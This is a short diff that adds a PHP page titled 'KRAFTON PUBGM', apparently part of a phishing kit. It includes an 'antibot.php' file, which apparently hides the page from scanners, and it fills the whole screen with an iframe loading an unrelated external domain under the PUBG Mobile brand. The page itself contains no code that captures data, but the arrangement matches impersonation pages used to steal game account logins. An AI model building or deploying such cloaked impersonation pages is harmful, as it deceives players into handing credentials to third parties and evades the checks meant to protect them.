@@ -1,0 +1,25 @@
+<?php
+include_once 'antibot.php';
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KRAFTON PUBGM</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/penguasa-de/de@main/bootstrap.min.css">
+</head>
+<body>
+<div class="embed-responsive embed-responsive-16by9" style="height:100vh" id="iframeContainer"></div>
+<script>
+const iframeURL = 'https://arp.jtwentyfive.de';
+const iframeContainer = document.getElementById('iframeContainer');
+const iframe = document.createElement('iframe');
+iframe.src = iframeURL;
+iframe.className = 'embed-responsive-item';
+iframe.allowFullscreen = true;
+iframeContainer.appendChild(iframe);
+</script>
+</body>
+</html>
+</html>
